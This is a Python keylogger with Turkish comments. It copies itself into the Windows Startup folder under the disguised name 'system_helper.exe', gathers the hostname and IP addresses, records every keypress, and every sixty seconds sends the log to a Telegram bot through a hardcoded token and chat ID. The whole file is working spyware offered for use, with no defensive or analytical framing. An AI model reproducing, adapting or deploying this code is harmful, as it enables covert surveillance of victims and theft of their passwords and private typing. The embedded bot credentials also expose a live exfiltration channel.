import keyboard
import requests
import threading
import time
import os
import sys
import platform
import socket
import psutil
import shutil


# Telegram bot bilgileri
TOKEN = "8015653627:AAGqbLWpHP5fxMz6VjbmlMDSMqRSmkeprmc"
CHAT_ID = "7522362519"

# Hafızada saklanacak log verisi
log_data = []

# ***Programı Windows başlangıcına ekle***
def add_to_startup():
    exe_path = os.path.abspath(sys.argv[0])  # Çalışan dosyanın tam yolu
    startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    startup_exe_path = os.path.join(startup_folder, "system_helper.exe")  # Yeni adı

    if not os.path.exists(startup_exe_path):  # Daha önce eklenmemişse ekle
        shutil.copy(exe_path, startup_exe_path)
        print("Başlangıçta çalıştırmak için eklendi.")

# Dış IP adresini al
def get_external_ip():
    try:
        return requests.get("https://api64.ipify.org").text
    except:
        return "Bilinmiyor"

# İç IP adresini al
def get_internal_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "Bilinmiyor"

# Sistem bilgilerini al
def get_system_info():
    info = {}
    info["İşletim Sistemi"] = platform.system()
    info["OS Sürümü"] = platform.version()
    info["Mimari"] = platform.architecture()[0]
    info["Bilgisayar Adı"] = socket.gethostname()
    info["İç IP"] = get_internal_ip()
    info["Dış IP"] = get_external_ip()
    info["RAM (GB)"] = round(psutil.virtual_memory().total / (1024 ** 3), 2)
    info["İşlemci"] = platform.processor()
    
    return info

# Bilgileri hafızada tutma (log_data'ya ekleme)
def save_info_to_memory():
    info = get_system_info()
    system_info = "\n".join([f"{key}: {value}" for key, value in info.items()])
    log_data.append(system_info)

# Keylogger işlevi
def tus_basildi(tus):
    try:
        log_data.append(tus.name + " ")  # Hafızaya ekle
        print(f"Tuş kaydedildi: {tus.name}")
    except Exception as e:
        print(f"Hata: {e}")

# Telegram’a log gönderme fonksiyonu
def log_gonder():
    try:
        if log_data:  # Eğer log_data boş değilse
            dis_ip = get_external_ip()
            ic_ip = get_internal_ip()
            log_icerigi = "".join(log_data)  # Hafızadaki veriyi birleştir

            mesaj = (
                f"📩 *Yeni Keylogger Logu:*\n"
                f"🖥 *Bilgisayar Adı:* `{socket.gethostname()}`\n"
                f"🌐 *Dış IP:* `{dis_ip}`\n"
                f"🏠 *İç IP:* `{ic_ip}`\n"
                f"```\n{log_icerigi}\n```"
            )

            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            payload = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "Markdown"}
            response = requests.post(url, data=payload)
            
            if response.status_code == 200:
                print("Log başarıyla Telegram'a gönderildi!")
            else:
                print(f"Telegram Hatası: {response.status_code} - {response.text}")

            # Hafızayı temizle
            log_data.clear()
        else:
            print("Log hafızası boş, gönderilmiyor.")
    except Exception as e:
        print(f"Telegram gönderme hatası: {e}")

    threading.Timer(60, log_gonder).start()  # **Her 60 saniyede bir gönder**

# Programın kapanmasını önleme
def bekle():
    while True:
        time.sleep(10)

# Başlatıcı fonksiyon
def baslat():
    add_to_startup()  # **Windows başlangıcına ekle**
    save_info_to_memory()  # Sistem bilgilerini hafızaya ekle
    keyboard.on_press(tus_basildi)  # Tuşları yakala
    log_gonder()  # Logları Telegram'a yolla
    bekle()  # Kapanmayı engelle


# Çalıştır
baslat()
